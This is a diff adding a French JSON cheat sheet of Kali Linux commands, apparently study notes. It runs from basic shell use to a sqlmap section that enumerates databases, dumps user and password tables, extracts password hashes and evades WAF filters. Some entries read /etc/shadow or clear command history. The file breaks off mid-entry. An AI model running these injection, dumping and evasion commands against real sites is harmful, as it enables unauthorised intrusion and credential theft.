@@ -1,0 +1,1294 @@
+{
+  "source": "pasted_content.txt (source fournie par l’utilisateur)",
+  "sha256": "962a4b06754236e6b8b196fe20cc78adbabb4de34f6e08416c1c9c5ebb2101e9",
+  "records": [
+    {
+      "id": "nav-1",
+      "section": "navigation",
+      "cmd": "pwd",
+      "desc": "Voir où je suis",
+      "example": "/home/kali"
+    },
+    {
+      "id": "nav-2",
+      "section": "navigation",
+      "cmd": "ls",
+      "desc": "Lister les fichiers",
+      "example": "Desktop Documents…"
+    },
+    {
+      "id": "nav-3",
+      "section": "navigation",
+      "cmd": "ls -la",
+      "desc": "Lister avec détails et fichiers cachés",
+      "example": "ls -la"
+    },
+    {
+      "id": "nav-4",
+      "section": "navigation",
+      "cmd": "cd dossier",
+      "desc": "Entrer dans un dossier",
+      "example": "cd Desktop"
+    },
+    {
+      "id": "nav-5",
+      "section": "navigation",
+      "cmd": "cd ..",
+      "desc": "Remonter d'un dossier",
+      "example": "→ revient en arrière"
+    },
+    {
+      "id": "nav-6",
+      "section": "navigation",
+      "cmd": "cd",
+      "desc": "Retourner à l'accueil",
+      "example": "/home/kali"
+    },
+    {
+      "id": "nav-7",
+      "section": "navigation",
+      "cmd": "cd /",
+      "desc": "Aller à la racine du système",
+      "example": "/"
+    },
+    {
+      "id": "nav-8",
+      "section": "navigation",
+      "cmd": "cd ~",
+      "desc": "Aller au dossier personnel",
+      "example": "/home/kali"
+    },
+    {
+      "id": "file-1",
+      "section": "files",
+      "cmd": "mkdir nom",
+      "desc": "Créer un dossier",
+      "example": "mkdir mon_dossier"
+    },
+    {
+      "id": "file-2",
+      "section": "files",
+      "cmd": "mkdir -p a/b/c",
+      "desc": "Créer dossiers imbriqués",
+      "example": "mkdir -p dossier/sous/sous2"
+    },
+    {
+      "id": "file-3",
+      "section": "files",
+      "cmd": "touch nom",
+      "desc": "Créer un fichier vide",
+      "example": "touch fichier.txt"
+    },
+    {
+      "id": "file-4",
+      "section": "files",
+      "cmd": "cat fichier",
+      "desc": "Lire un fichier",
+      "example": "cat fichier.txt"
+    },
+    {
+      "id": "file-5",
+      "section": "files",
+      "cmd": "echo \"texte\"",
+      "desc": "Écrire dans un fichier",
+      "example": "echo \"salut\" \u003e fichier.txt"
+    },
+    {
+      "id": "file-6",
+      "section": "files",
+      "cmd": "echo \"texte\" \u003e\u003e",
+      "desc": "Ajouter à la fin d'un fichier",
+      "example": "echo \"ligne2\" \u003e\u003e fichier.txt"
+    },
+    {
+      "id": "file-7",
+      "section": "files",
+      "cmd": "rm fichier",
+      "desc": "Supprimer un fichier",
+      "example": "rm fichier.txt"
+    },
+    {
+      "id": "file-8",
+      "section": "files",
+      "cmd": "rm -rf dossier",
+      "desc": "Supprimer un dossier (irréversible)",
+      "example": "rm -rf mon_dossier"
+    },
+    {
+      "id": "file-9",
+      "section": "files",
+      "cmd": "mv ancien nouveau",
+      "desc": "Déplacer ou renommer",
+      "example": "mv a.txt b.txt"
+    },
+    {
+      "id": "file-10",
+      "section": "files",
+      "cmd": "cp source dest",
+      "desc": "Copier un fichier",
+      "example": "cp a.txt b.txt"
+    },
+    {
+      "id": "file-11",
+      "section": "files",
+      "cmd": "cp -r dossier dest",
+      "desc": "Copier un dossier entier",
+      "example": "cp -r dossier/ backup/"
+    },
+    {
+      "id": "file-12",
+      "section": "files",
+      "cmd": "find / -name",
+      "desc": "Chercher un fichier",
+      "example": "find / -name fichier.txt"
+    },
+    {
+      "id": "file-13",
+      "section": "files",
+      "cmd": "locate nom",
+      "desc": "Trouver un fichier rapidement",
+      "example": "locate passwords.txt"
+    },
+    {
+      "id": "file-14",
+      "section": "files",
+      "cmd": "file nom",
+      "desc": "Voir le type d'un fichier",
+      "example": "file image.png"
+    },
+    {
+      "id": "file-15",
+      "section": "files",
+      "cmd": "wc -l fichier",
+      "desc": "Compter les lignes",
+      "example": "wc -l fichier.txt"
+    },
+    {
+      "id": "file-16",
+      "section": "files",
+      "cmd": "head fichier",
+      "desc": "Voir les 10 premières lignes",
+      "example": "head fichier.txt"
+    },
+    {
+      "id": "file-17",
+      "section": "files",
+      "cmd": "tail fichier",
+      "desc": "Voir les 10 dernières lignes",
+      "example": "tail fichier.txt"
+    },
+    {
+      "id": "file-18",
+      "section": "files",
+      "cmd": "grep \"mot\" fichier",
+      "desc": "Chercher un mot dans un fichier",
+      "example": "grep \"password\" fichier.txt"
+    },
+    {
+      "id": "perm-1",
+      "section": "permissions",
+      "cmd": "chmod +x fichier",
+      "desc": "Rendre exécutable",
+      "example": "chmod +x script.sh"
+    },
+    {
+      "id": "perm-2",
+      "section": "permissions",
+      "cmd": "chmod 777 fichier",
+      "desc": "Tous les droits à tous",
+      "example": "chmod 777 fichier.txt"
+    },
+    {
+      "id": "perm-3",
+      "section": "permissions",
+      "cmd": "chmod 600 fichier",
+      "desc": "Lecture/écriture pour moi seul",
+      "example": "chmod 600 secret.txt"
+    },
+    {
+      "id": "perm-4",
+      "section": "permissions",
+      "cmd": "chown user fichier",
+      "desc": "Changer le propriétaire",
+      "example": "chown kali fichier.txt"
+    },
+    {
+      "id": "perm-5",
+      "section": "permissions",
+      "cmd": "sudo commande",
+      "desc": "Exécuter en admin",
+      "example": "sudo apt update"
+    },
+    {
+      "id": "perm-6",
+      "section": "permissions",
+      "cmd": "sudo su",
+      "desc": "Devenir root (privilèges max)",
+      "example": "→ # à la place de $"
+    },
+    {
+      "id": "net-1",
+      "section": "network",
+      "cmd": "ifconfig",
+      "desc": "Voir mon adresse IP",
+      "example": "inet 192.168.x.x"
+    },
+    {
+      "id": "net-2",
+      "section": "network",
+      "cmd": "ip a",
+      "desc": "Voir les interfaces réseau",
+      "example": "ip a"
+    },
+    {
+      "id": "net-3",
+      "section": "network",
+      "cmd": "ping adresse",
+      "desc": "Tester une connexion",
+      "example": "ping google.com"
+    },
+    {
+      "id": "net-4",
+      "section": "network",
+      "cmd": "nmap adresse",
+      "desc": "Scanner les ports d'une IP",
+      "example": "nmap 192.168.1.1"
+    },
+    {
+      "id": "net-5",
+      "section": "network",
+      "cmd": "netstat -tulpn",
+      "desc": "Voir les ports ouverts",
+      "example": "netstat -tulpn"
+    },
+    {
+      "id": "net-6",
+      "section": "network",
+      "cmd": "wget url",
+      "desc": "Télécharger un fichier",
+      "example": "wget https://site.com/fichier"
+    },
+    {
+      "id": "net-7",
+      "section": "network",
+      "cmd": "curl url",
+      "desc": "Faire une requête web",
+      "example": "curl https://site.com"
+    },
+    {
+      "id": "net-8",
+      "section": "network",
+      "cmd": "ssh user@ip",
+      "desc": "Se connecter à distance",
+      "example": "ssh kali@192.168.1.1"
+    },
+    {
+      "id": "sys-1",
+      "section": "system",
+      "cmd": "uname -a",
+      "desc": "Infos sur le système",
+      "example": "Linux kali 6.x..."
+    },
+    {
+      "id": "sys-2",
+      "section": "system",
+      "cmd": "whoami",
+      "desc": "Voir mon nom d'utilisateur",
+      "example": "kali"
+    },
+    {
+      "id": "sys-3",
+      "section": "system",
+      "cmd": "id",
+      "desc": "Voir mon identifiant et groupe",
+      "example": "uid=1000(kali)"
+    },
+    {
+      "id": "sys-4",
+      "section": "system",
+      "cmd": "ps aux",
+      "desc": "Voir les processus en cours",
+      "example": "ps aux"
+    },
+    {
+      "id": "sys-5",
+      "section": "system",
+      "cmd": "kill PID",
+      "desc": "Arrêter un processus",
+      "example": "kill 1234"
+    },
+    {
+      "id": "sys-6",
+      "section": "system",
+      "cmd": "top",
+      "desc": "Voir l'utilisation CPU/RAM",
+      "example": "top"
+    },
+    {
+      "id": "sys-7",
+      "section": "system",
+      "cmd": "df -h",
+      "desc": "Voir l'espace disque",
+      "example": "80G disponible"
+    },
+    {
+      "id": "sys-8",
+      "section": "system",
+      "cmd": "free -h",
+      "desc": "Voir la RAM disponible",
+      "example": "2G total"
+    },
+    {
+      "id": "sys-9",
+      "section": "system",
+      "cmd": "history",
+      "desc": "Voir l'historique des commandes",
+      "example": "history"
+    },
+    {
+      "id": "sys-10",
+      "section": "system",
+      "cmd": "clear",
+      "desc": "Effacer l'écran",
+      "example": "clear"
+    },
+    {
+      "id": "sys-11",
+      "section": "system",
+      "cmd": "reboot",
+      "desc": "Redémarrer le système",
+      "example": "reboot"
+    },
+    {
+      "id": "sys-12",
+      "section": "system",
+      "cmd": "shutdown now",
+      "desc": "Éteindre le système",
+      "example": "shutdown now"
+    },
+    {
+      "id": "pkg-1",
+      "section": "packages",
+      "cmd": "sudo apt update",
+      "desc": "Mettre à jour la liste des paquets",
+      "example": "sudo apt update"
+    },
+    {
+      "id": "pkg-2",
+      "section": "packages",
+      "cmd": "sudo apt upgrade",
+      "desc": "Mettre à jour tous les programmes",
+      "example": "sudo apt upgrade"
+    },
+    {
+      "id": "pkg-3",
+      "section": "packages",
+      "cmd": "sudo apt install",
+      "desc": "Installer un programme",
+      "example": "sudo apt install nmap"
+    },
+    {
+      "id": "pkg-4",
+      "section": "packages",
+      "cmd": "sudo apt remove",
+      "desc": "Désinstaller un programme",
+      "example": "sudo apt remove nmap"
+    },
+    {
+      "id": "scr-1",
+      "section": "scripts",
+      "cmd": "nano fichier.sh",
+      "desc": "Créer/éditer un script",
+      "example": "nano mon_script.sh"
+    },
+    {
+      "id": "scr-2",
+      "section": "scripts",
+      "cmd": "bash fichier.sh",
+      "desc": "Lancer un script",
+      "example": "bash mon_script.sh"
+    },
+    {
+      "id": "scr-3",
+      "section": "scripts",
+      "cmd": "#!/bin/bash",
+      "desc": "Début obligatoire de tout script",
+      "example": "première ligne du script"
+    },
+    {
+      "id": "scr-4",
+      "section": "scripts",
+      "cmd": "nom=\"valeur\"",
+      "desc": "Créer une variable",
+      "example": "age=17"
+    },
+    {
+      "id": "scr-5",
+      "section": "scripts",
+      "cmd": "echo $nom",
+      "desc": "Utiliser une variable",
+      "example": "echo $age → 17"
+    },
+    {
+      "id": "scr-6",
+      "section": "scripts",
+      "cmd": "if [ ] then fi",
+      "desc": "Condition",
+      "example": "if [ $age -ge 18 ]"
+    },
+    {
+      "id": "scr-7",
+      "section": "scripts",
+      "cmd": "for i in liste",
+      "desc": "Boucle for",
+      "example": "for i in 1 2 3"
+    },
+    {
+      "id": "scr-8",
+      "section": "scripts",
+      "cmd": "while [ condition ]",
+      "desc": "Boucle while",
+      "example": "while [ $i -lt 10 ]"
+    },
+    {
+      "id": "scr-9",
+      "section": "scripts",
+      "cmd": "read variable",
+      "desc": "Demander une entrée utilisateur",
+      "example": "read nom"
+    },
+    {
+      "id": "scr-10",
+      "section": "scripts",
+      "cmd": "commande1 | commande2",
+      "desc": "Pipe — relier deux commandes",
+      "example": "ls | grep fichier"
+    },
+    {
+      "id": "cmp-1",
+      "section": "comparisons",
+      "cmd": "-eq",
+      "desc": "Égal à",
+      "example": "[ $a -eq $b ]"
+    },
+    {
+      "id": "cmp-2",
+      "section": "comparisons",
+      "cmd": "-ne",
+      "desc": "Différent de",
+      "example": "[ $a -ne $b ]"
+    },
+    {
+      "id": "cmp-3",
+      "section": "comparisons",
+      "cmd": "-gt",
+      "desc": "Supérieur à",
+      "example": "[ $a -gt $b ]"
+    },
+    {
+      "id": "cmp-4",
+      "section": "comparisons",
+      "cmd": "-lt",
+      "desc": "Inférieur à",
+      "example": "[ $a -lt $b ]"
+    },
+    {
+      "id": "cmp-5",
+      "section": "comparisons",
+      "cmd": "-ge",
+      "desc": "Supérieur ou égal à",
+      "example": "[ $a -ge $b ]"
+    },
+    {
+      "id": "cmp-6",
+      "section": "comparisons",
+      "cmd": "-le",
+      "desc": "Inférieur ou égal à",
+      "example": "[ $a -le $b ]"
+    },
+    {
+      "id": "hidden-1",
+      "section": "hidden-files",
+      "cmd": "ls -a",
+      "desc": "Voir les fichiers cachés",
+      "example": ".bashrc .ssh …"
+    },
+    {
+      "id": "hidden-2",
+      "section": "hidden-files",
+      "cmd": "ls -la",
+      "desc": "Voir cachés avec détails",
+      "example": "permissions taille date"
+    },
+    {
+      "id": "hidden-3",
+      "section": "hidden-files",
+      "cmd": "touch .nom",
+      "desc": "Créer un fichier caché",
+      "example": "touch .secret.txt"
+    },
+    {
+      "id": "hidden-4",
+      "section": "hidden-files",
+      "cmd": "mkdir .nom",
+      "desc": "Créer un dossier caché",
+      "example": "mkdir .cache"
+    },
+    {
+      "id": "hidden-5",
+      "section": "hidden-files",
+      "cmd": "mv fichier .fichier",
+      "desc": "Cacher un fichier existant",
+      "example": "mv notes.txt .notes.txt"
+    },
+    {
+      "id": "hidden-6",
+      "section": "hidden-files",
+      "cmd": "find / -name \".*\"",
+      "desc": "Chercher tous les fichiers cachés",
+      "example": "find /home -name \".*\""
+    },
+    {
+      "id": "backup-1",
+      "section": "backup",
+      "cmd": "cp -r dossier backup",
+      "desc": "Sauvegarder un dossier",
+      "example": "cp -r Documents backup/"
+    },
+    {
+      "id": "backup-2",
+      "section": "backup",
+      "cmd": "tar -cvf archive.tar",
+      "desc": "Créer une archive",
+      "example": "tar -cvf backup.tar dossier/"
+    },
+    {
+      "id": "backup-3",
+      "section": "backup",
+      "cmd": "tar -xvf archive.tar",
+      "desc": "Extraire une archive",
+      "example": "tar -xvf backup.tar"
+    },
+    {
+      "id": "backup-4",
+      "section": "backup",
+      "cmd": "tar -czvf archive.tar.gz",
+      "desc": "Créer archive compressée",
+      "example": "tar -czvf backup.tar.gz dossier/"
+    },
+    {
+      "id": "backup-5",
+      "section": "backup",
+      "cmd": "tar -xzvf archive.tar.gz",
+      "desc": "Extraire archive compressée",
+      "example": "tar -xzvf backup.tar.gz"
+    },
+    {
+      "id": "backup-6",
+      "section": "backup",
+      "cmd": "zip -r archive.zip",
+      "desc": "Créer un zip",
+      "example": "zip -r backup.zip dossier/"
+    },
+    {
+      "id": "backup-7",
+      "section": "backup",
+      "cmd": "unzip archive.zip",
+      "desc": "Extraire un zip",
+      "example": "unzip backup.zip"
+    },
+    {
+      "id": "backup-8",
+      "section": "backup",
+      "cmd": "rsync -av src dest",
+      "desc": "Synchroniser deux dossiers",
+      "example": "rsync -av docs/ backup/"
+    },
+    {
+      "id": "advsearch-1",
+      "section": "advanced-search",
+      "cmd": "find / -name \"*.txt\"",
+      "desc": "Chercher par extension",
+      "example": "find / -name \"*.log\""
+    },
+    {
+      "id": "advsearch-2",
+      "section": "advanced-search",
+      "cmd": "find / -type f",
+      "desc": "Chercher seulement les fichiers",
+      "example": "find /home -type f"
+    },
+    {
+      "id": "advsearch-3",
+      "section": "advanced-search",
+      "cmd": "find / -type d",
+      "desc": "Chercher seulement les dossiers",
+      "example": "find /home -type d"
+    },
+    {
+      "id": "advsearch-4",
+      "section": "advanced-search",
+      "cmd": "find / -size +100M",
+      "desc": "Chercher fichiers volumineux",
+      "example": "find / -size +500M"
+    },
+    {
+      "id": "advsearch-5",
+      "section": "advanced-search",
+      "cmd": "grep -r \"mot\" dossier",
+      "desc": "Chercher un mot dans tous les fichiers",
+      "example": "grep -r \"password\" /etc/"
+    },
+    {
+      "id": "advsearch-6",
+      "section": "advanced-search",
+      "cmd": "grep -i \"mot\" fichier",
+      "desc": "Chercher sans tenir compte majuscules",
+      "example": "grep -i \"admin\" fichier.txt"
+    },
+    {
+      "id": "advsearch-7",
+      "section": "advanced-search",
+      "cmd": "grep -v \"mot\" fichier",
+      "desc": "Exclure les lignes contenant le mot",
+      "example": "grep -v \"erreur\" log.txt"
+    },
+    {
+      "id": "advsearch-8",
+      "section": "advanced-search",
+      "cmd": "grep -n \"mot\" fichier",
+      "desc": "Chercher avec numéro de ligne",
+      "example": "grep -n \"root\" /etc/passwd"
+    },
+    {
+      "id": "fileedit-1",
+      "section": "file-edit",
+      "cmd": "cat fichier",
+      "desc": "Lire un fichier entier",
+      "example": "cat fichier.txt"
+    },
+    {
+      "id": "fileedit-2",
+      "section": "file-edit",
+      "cmd": "less fichier",
+      "desc": "Lire page par page (q pour quitter)",
+      "example": "less fichier.txt"
+    },
+    {
+      "id": "fileedit-3",
+      "section": "file-edit",
+      "cmd": "more fichier",
+      "desc": "Lire page par page simple",
+      "example": "more fichier.txt"
+    },
+    {
+      "id": "fileedit-4",
+      "section": "file-edit",
+      "cmd": "head -n 20 fichier",
+      "desc": "Voir les 20 premières lignes",
+      "example": "head -n 20 fichier.txt"
+    },
+    {
+      "id": "fileedit-5",
+      "section": "file-edit",
+      "cmd": "tail -n 20 fichier",
+      "desc": "Voir les 20 dernières lignes",
+      "example": "tail -n 20 fichier.txt"
+    },
+    {
+      "id": "fileedit-6",
+      "section": "file-edit",
+      "cmd": "tail -f fichier",
+      "desc": "Suivre un fichier en temps réel",
+      "example": "tail -f /var/log/syslog"
+    },
+    {
+      "id": "fileedit-7",
+      "section": "file-edit",
+      "cmd": "diff fichier1 fichier2",
+      "desc": "Comparer deux fichiers",
+      "example": "diff ancien.txt nouveau.txt"
+    },
+    {
+      "id": "fileedit-8",
+      "section": "file-edit",
+      "cmd": "sort fichier",
+      "desc": "Trier les lignes d'un fichier",
+      "example": "sort liste.txt"
+    },
+    {
+      "id": "fileedit-9",
+      "section": "file-edit",
+      "cmd": "uniq fichier",
+      "desc": "Supprimer les doublons",
+      "example": "sort liste.txt | uniq"
+    },
+    {
+      "id": "fileedit-10",
+      "section": "file-edit",
+      "cmd": "cut -d: -f1 fichier",
+      "desc": "Extraire une colonne",
+      "example": "cut -d: -f1 /etc/passwd"
+    },
+    {
+      "id": "fileedit-11",
+      "section": "file-edit",
+      "cmd": "sed 's/ancien/nouveau/' f",
+      "desc": "Remplacer du texte",
+      "example": "sed 's/admin/root/' fichier.txt"
+    },
+    {
+      "id": "fileedit-12",
+      "section": "file-edit",
+      "cmd": "awk '{print $1}' fichier",
+      "desc": "Extraire la première colonne",
+      "example": "awk '{print $1}' log.txt"
+    },
+    {
+      "id": "users-1",
+      "section": "users-groups",
+      "cmd": "whoami",
+      "desc": "Voir mon nom d'utilisateur",
+      "example": "→ kali"
+    },
+    {
+      "id": "users-2",
+      "section": "users-groups",
+      "cmd": "id",
+      "desc": "Voir mon identifiant et groupe",
+      "example": "→ uid=1000(kali)"
+    },
+    {
+      "id": "users-3",
+      "section": "users-groups",
+      "cmd": "who",
+      "desc": "Voir qui est connecté",
+      "example": "→ kali tty1"
+    },
+    {
+      "id": "users-4",
+      "section": "users-groups",
+      "cmd": "passwd",
+      "desc": "Changer mon mot de passe",
+      "example": "passwd"
+    },
+    {
+      "id": "users-5",
+      "section": "users-groups",
+      "cmd": "adduser nom",
+      "desc": "Créer un utilisateur",
+      "example": "sudo adduser hacker"
+    },
+    {
+      "id": "users-6",
+      "section": "users-groups",
+      "cmd": "deluser nom",
+      "desc": "Supprimer un utilisateur",
+      "example": "sudo deluser hacker"
+    },
+    {
+      "id": "users-7",
+      "section": "users-groups",
+      "cmd": "cat /etc/passwd",
+      "desc": "Voir tous les utilisateurs",
+      "example": "cat /etc/passwd"
+    },
+    {
+      "id": "users-8",
+      "section": "users-groups",
+      "cmd": "cat /etc/shadow",
+      "desc": "Voir les mots de passe hashés",
+      "example": "sudo cat /etc/shadow"
+    },
+    {
+      "id": "proc-1",
+      "section": "process-services",
+      "cmd": "ps aux",
+      "desc": "Voir tous les processus",
+      "example": "ps aux"
+    },
+    {
+      "id": "proc-2",
+      "section": "process-services",
+      "cmd": "ps aux | grep nom",
+      "desc": "Chercher un processus",
+      "example": "ps aux | grep firefox"
+    },
+    {
+      "id": "proc-3",
+      "section": "process-services",
+      "cmd": "kill PID",
+      "desc": "Arrêter un processus",
+      "example": "kill 1234"
+    },
+    {
+      "id": "proc-4",
+      "section": "process-services",
+      "cmd": "kill -9 PID",
+      "desc": "Forcer l'arrêt d'un processus",
+      "example": "kill -9 1234"
+    },
+    {
+      "id": "proc-5",
+      "section": "process-services",
+      "cmd": "killall nom",
+      "desc": "Tuer tous les processus du même nom",
+      "example": "killall firefox"
+    },
+    {
+      "id": "proc-6",
+      "section": "process-services",
+      "cmd": "top",
+      "desc": "Voir CPU/RAM en temps réel",
+      "example": "top"
+    },
+    {
+      "id": "proc-7",
+      "section": "process-services",
+      "cmd": "htop",
+      "desc": "Version améliorée de top",
+      "example": "htop"
+    },
+    {
+      "id": "proc-8",
+      "section": "process-services",
+      "cmd": "service nom start",
+      "desc": "Démarrer un service",
+      "example": "service apache2 start"
+    },
+    {
+      "id": "proc-9",
+      "section": "process-services",
+      "cmd": "service nom stop",
+      "desc": "Arrêter un service",
+      "example": "service apache2 stop"
+    },
+    {
+      "id": "proc-10",
+      "section": "process-services",
+      "cmd": "systemctl status nom",
+      "desc": "Voir l'état d'un service",
+      "example": "systemctl status ssh"
+    },
+    {
+      "id": "netadv-1",
+      "section": "network-advanced",
+      "cmd": "ifconfig",
+      "desc": "Voir mon adresse IP",
+      "example": "→ inet 192.168.x.x"
+    },
+    {
+      "id": "netadv-2",
+      "section": "network-advanced",
+      "cmd": "ip a",
+      "desc": "Voir les interfaces réseau",
+      "example": "ip a"
+    },
+    {
+      "id": "netadv-3",
+      "section": "network-advanced",
+      "cmd": "ping -c 4 adresse",
+      "desc": "Envoyer 4 pings",
+      "example": "ping -c 4 google.com"
+    },
+    {
+      "id": "netadv-4",
+      "section": "network-advanced",
+      "cmd": "traceroute adresse",
+      "desc": "Voir le chemin des paquets",
+      "example": "traceroute google.com"
+    },
+    {
+      "id": "netadv-5",
+      "section": "network-advanced",
+      "cmd": "nmap -sV adresse",
+      "desc": "Scanner les versions des services",
+      "example": "nmap -sV 192.168.1.1"
+    },
+    {
+      "id": "netadv-6",
+      "section": "network-advanced",
+      "cmd": "nmap -A adresse",
+      "desc": "Scanner complet agressif",
+      "example": "nmap -A 192.168.1.1"
+    },
+    {
+      "id": "netadv-7",
+      "section": "network-advanced",
+      "cmd": "nmap -p 80 adresse",
+      "desc": "Scanner un port spécifique",
+      "example": "nmap -p 22,80,443 192.168.1.1"
+    },
+    {
+      "id": "netadv-8",
+      "section": "network-advanced",
+      "cmd": "netstat -tulpn",
+      "desc": "Voir les ports ouverts",
+      "example": "netstat -tulpn"
+    },
+    {
+      "id": "netadv-9",
+      "section": "network-advanced",
+      "cmd": "wget url",
+      "desc": "Télécharger un fichier",
+      "example": "wget https://site.com/fichier"
+    },
+    {
+      "id": "netadv-10",
+      "section": "network-advanced",
+      "cmd": "curl -I url",
+      "desc": "Voir les headers d'un site",
+      "example": "curl -I https://google.com"
+    },
+    {
+      "id": "netadv-11",
+      "section": "network-advanced",
+      "cmd": "ssh user@ip",
+      "desc": "Connexion distante",
+      "example": "ssh kali@192.168.1.1"
+    },
+    {
+      "id": "netadv-12",
+      "section": "network-advanced",
+      "cmd": "scp fichier user@ip:/dest",
+      "desc": "Copier un fichier à distance",
+      "example": "scp fichier.txt kali@192.168.1.1:/home/"
+    },
+    {
+      "id": "netadv-13",
+      "section": "network-advanced",
+      "cmd": "nmap -sC adresse",
+      "desc": "Scanner avec les scripts par défaut (NSE)",
+      "example": "nmap -sC -sV 192.168.1.1"
+    },
+    {
+      "id": "netadv-14",
+      "section": "network-advanced",
+      "cmd": "whois domaine",
+      "desc": "Infos sur le propriétaire d'un domaine",
+      "example": "whois example.com"
+    },
+    {
+      "id": "netadv-15",
+      "section": "network-advanced",
+      "cmd": "dig domaine",
+      "desc": "Interroger les DNS d'un domaine",
+      "example": "dig example.com"
+    },
+    {
+      "id": "env-1",
+      "section": "env-vars",
+      "cmd": "echo $PATH",
+      "desc": "Voir les chemins des programmes",
+      "example": "→ /usr/bin:/bin:…"
+    },
+    {
+      "id": "env-2",
+      "section": "env-vars",
+      "cmd": "echo $HOME",
+      "desc": "Voir mon dossier personnel",
+      "example": "→ /home/kali"
+    },
+    {
+      "id": "env-3",
+      "section": "env-vars",
+      "cmd": "echo $USER",
+      "desc": "Voir mon nom d'utilisateur",
+      "example": "→ kali"
+    },
+    {
+      "id": "env-4",
+      "section": "env-vars",
+      "cmd": "export VAR=valeur",
+      "desc": "Créer une variable globale",
+      "example": "export MON_IP=192.168.1.1"
+    },
+    {
+      "id": "env-5",
+      "section": "env-vars",
+      "cmd": "env",
+      "desc": "Voir toutes les variables",
+      "example": "env"
+    },
+    {
+      "id": "env-6",
+      "section": "env-vars",
+      "cmd": "alias nom='commande'",
+      "desc": "Créer un raccourci de commande",
+      "example": "alias ll='ls -la'"
+    },
+    {
+      "id": "logs-1",
+      "section": "logs-monitoring",
+      "cmd": "cat /var/log/syslog",
+      "desc": "Voir les logs système",
+      "example": "cat /var/log/syslog"
+    },
+    {
+      "id": "logs-2",
+      "section": "logs-monitoring",
+      "cmd": "cat /var/log/auth.log",
+      "desc": "Voir les logs de connexion",
+      "example": "sudo cat /var/log/auth.log"
+    },
+    {
+      "id": "logs-3",
+      "section": "logs-monitoring",
+      "cmd": "tail -f /var/log/syslog",
+      "desc": "Suivre les logs en direct",
+      "example": "tail -f /var/log/syslog"
+    },
+    {
+      "id": "logs-4",
+      "section": "logs-monitoring",
+      "cmd": "dmesg",
+      "desc": "Voir les messages du noyau",
+      "example": "dmesg | tail"
+    },
+    {
+      "id": "logs-5",
+      "section": "logs-monitoring",
+      "cmd": "last",
+      "desc": "Voir les dernières connexions",
+      "example": "last"
+    },
+    {
+      "id": "logs-6",
+      "section": "logs-monitoring",
+      "cmd": "history -c",
+      "desc": "Effacer l'historique des commandes",
+      "example": "history -c"
+    },
+    {
+      "id": "sqlmap-1",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --dbs",
+      "desc": "Tester un paramètre GET et lister les bases si vulnérable",
+      "example": "sqlmap -u \"http://site.com/page.php?cat=1\" --dbs"
+    },
+    {
+      "id": "sqlmap-2",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL\" --forms --batch --dbs",
+      "desc": "Détecter et tester automatiquement les formulaires de la page",
+      "example": "sqlmap -u \"http://site.com/login.php\" --forms --batch --dbs"
+    },
+    {
+      "id": "sqlmap-3",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL\" --data=\"user=a\u0026pass=b\" --dbs",
+      "desc": "Tester une requête POST en donnant les vrais noms de champs",
+      "example": "sqlmap -u \"http://site.com/login.php\" --data=\"username=test\u0026password=test\" --dbs"
+    },
+    {
+      "id": "sqlmap-4",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" -D base --tables",
+      "desc": "Lister les tables d'une base précise",
+      "example": "sqlmap -u \"http://site.com/page.php?cat=1\" -D hackit --tables"
+    },
+    {
+      "id": "sqlmap-5",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" -D base -T table --columns",
+      "desc": "Lister les colonnes d'une table",
+      "example": "sqlmap -u \"http://site.com/page.php?cat=1\" -D hackit -T level1_users --columns"
+    },
+    {
+      "id": "sqlmap-6",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" -D base -T table --dump",
+      "desc": "Extraire tout le contenu d'une table",
+      "example": "sqlmap -u \"http://site.com/page.php?cat=1\" -D hackit -T level1_users --dump"
+    },
+    {
+      "id": "sqlmap-7",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" -D base -T table -C col1,col2 --dump",
+      "desc": "Extraire seulement certaines colonnes (utile si --columns échoue)",
+      "example": "-D hackit -T level1_users -C username,password --dump"
+    },
+    {
+      "id": "sqlmap-8",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --current-user",
+      "desc": "Afficher l'utilisateur SQL courant",
+      "example": "--current-user"
+    },
+    {
+      "id": "sqlmap-9",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --current-db",
+      "desc": "Afficher la base de données courante",
+      "example": "--current-db"
+    },
+    {
+      "id": "sqlmap-10",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --passwords",
+      "desc": "Extraire les hashs des mots de passe SQL (si droits suffisants)",
+      "example": "--passwords"
+    },
+    {
+      "id": "sqlmap-11",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --technique=B",
+      "desc": "Forcer une seule technique (B=boolean, T=time, U=union, E=error, S=stacked)",
+      "example": "--technique=BT"
+    },
+    {
+      "id": "sqlmap-12",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --level=5 --risk=3",
+      "desc": "Augmenter le niveau de tests (plus long, plus de payloads testés)",
+      "example": "--level=5 --risk=3 --batch"
+    },
+    {
+      "id": "sqlmap-13",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --batch",
+      "desc": "Répondre automatiquement \"yes\" à toutes les questions de sqlmap",
+      "example": "--batch"
+    },
+    {
+      "id": "sqlmap-14",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --random-agent",
+      "desc": "Changer le User-Agent pour contourner certains filtres basiques",
+      "example": "--random-agent"
+    },
+    {
+      "id": "sqlmap-15",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --tamper=space2comment",
+      "desc": "Utiliser un script de contournement de WAF/filtre",
+      "example": "--tamper=space2comment"
+    },
+    {
+      "id": "sqlmap-16",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --hex",
+      "desc": "Encoder les données extraites en hexadécimal (fiabilise l'extraction)",
+      "example": "--hex"
+    },
+    {
+      "id": "sqlmap-17",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --no-cast",
+      "desc": "Désactiver le cast de type, utile si erreurs de récupération",
+      "example": "--no-cast"
+    },
+    {
+      "id": "sqlmap-18",
+      "section": "sqlmap",
+      "cmd": "sqlmap -u \"URL?id=1\" --cookie=\"PHPSESSID=xxx\"",
+      "desc": "Passer un cookie de session (utile si zone connectée)",
